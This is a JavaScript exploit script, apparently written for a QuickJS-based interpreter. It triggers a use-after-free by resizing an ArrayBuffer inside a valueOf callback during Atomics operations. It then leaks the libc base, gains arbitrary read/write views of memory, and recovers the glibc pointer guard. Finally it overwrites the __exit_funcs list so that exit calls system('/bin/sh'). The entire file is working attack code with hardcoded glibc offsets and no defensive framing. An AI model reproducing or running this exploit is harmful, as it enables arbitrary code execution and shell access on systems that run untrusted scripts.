import * as std from 'std';

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }
function rol64(x, r) {
  r = BigInt(r);
  return u64((x << r) | (x >> (64n - r)));
}

// Offsets for this glibc build
const MAIN_ARENA_PLUS_96_OFF = 0x203b20n;
const EXIT_FUNCS_PTR_OFF     = 0x203680n;
const BINSH_OFF              = 0x1cb42fn;
const SYSTEM_OFF             = 0x58750n;

// low 12 bits of main_arena+96 pointer are constant (base is page-aligned)
const MAIN_ARENA_PLUS_96_LOW = 0xb20n;

const SENT0 = 0x1111111111111111n;
const SENT1 = 0x2222222222222222n;

let drain = [];
function drain_small(n) {
  for (let i = 0; i < n; i++) drain.push({});
}

function leak_main_arena_plus_96_once() {
  let ab = new ArrayBuffer(0x2000, { maxByteLength: 0x2000 });
  let guard = new ArrayBuffer(0x5000);
  let ta = new BigUint64Array(ab);
  let mal = { valueOf(){ ab.resize(8); return 0n; } };
  let leak = Atomics.compareExchange(ta, 4, mal, 1n);
  if (guard.byteLength === 0xdead) print('');
  return leak;
}

function leak_libc_base() {
  for (let i = 0; i < 60; i++) {
    drain_small(200);
    let leak = leak_main_arena_plus_96_once();
    if ((leak & 0xfffn) !== MAIN_ARENA_PLUS_96_LOW)
      continue;
    // Heuristic: shared libs typically live high in canonical range
    if (leak < 0x700000000000n)
      continue;
    let base = leak - MAIN_ARENA_PLUS_96_OFF;
    if ((base & 0xfffn) !== 0n)
      continue;
    return { leak, base };
  }
  throw new Error('failed to leak libc');
}

function make_view_once(target_ptr, backing) {
  let victim = null;
  let rab = new ArrayBuffer(0x3000, { maxByteLength: 0x3000 });
  let rab_view = new BigUint64Array(rab);
  let guard = new ArrayBuffer(0x5000);

  const IDX_U_PTR = 11;

  let mal = {
    valueOf() {
      rab.resize(8);
      victim = new BigUint64Array(backing);
      return target_ptr;
    }
  };

  Atomics.store(rab_view, IDX_U_PTR, mal);
  if (guard.byteLength === 0xdead) print('');
  return victim;
}

function make_view_retry(target_ptr, backing, tries = 80) {
  for (let i = 0; i < tries; i++) {
    drain_small(200);
    let v = make_view_once(target_ptr, backing);
    if (v[0] === SENT0 && v[1] === SENT1)
      continue;
    return v;
  }
  throw new Error('make_view failed');
}

(function main() {
  // Keep memory use modest to avoid GC turbulence.
  drain_small(2000);

  const backing = new ArrayBuffer(0x10000);
  const backing_u64 = new BigUint64Array(backing);
  backing_u64[0] = SENT0;
  backing_u64[1] = SENT1;

  // Warm typed array shapes
  let warm1 = new BigUint64Array(backing);
  let warm2 = new BigUint64Array(backing);
  if (warm1.length + warm2.length === 0x1337) print('');

  const { leak: main_arena_plus_96, base: libc_base } = leak_libc_base();

  // --- Build a view covering likely TLS/TCB region just below libc ---
  const tls_scan_base = libc_base - 0x2000n;
  let tls = make_view_retry(tls_scan_base, backing);

  // Find fs_base via self-pointer
  let fs_base = 0n;
  for (let i = 0; i < 0x800; i++) { // scan 0x4000 bytes
    let addr = tls_scan_base + 8n * BigInt(i);
    if (tls[i] === addr) { fs_base = addr; break; }
  }
  if (fs_base === 0n) {
    throw new Error('fs_base not found');
  }
  const pointer_guard = tls[Number((fs_base + 0x30n - tls_scan_base) / 8n)];

  // --- Resolve __exit_funcs and patch list ---
  const exit_funcs_ptr_addr = libc_base + EXIT_FUNCS_PTR_OFF;
  let pview = make_view_retry(exit_funcs_ptr_addr, backing);
  const list_addr = pview[0];

  const system_addr = libc_base + SYSTEM_OFF;
  const mangled_system = rol64(system_addr ^ pointer_guard, 17);
  const binsh_addr = libc_base + BINSH_OFF;

  let lview = make_view_retry(list_addr, backing);

  lview[0] = 0n;
  lview[1] = 1n;
  lview[2] = 4n;
  lview[3] = mangled_system;
  lview[4] = binsh_addr;
  lview[5] = 0n;

  // exit -> system("/bin/sh")
})();
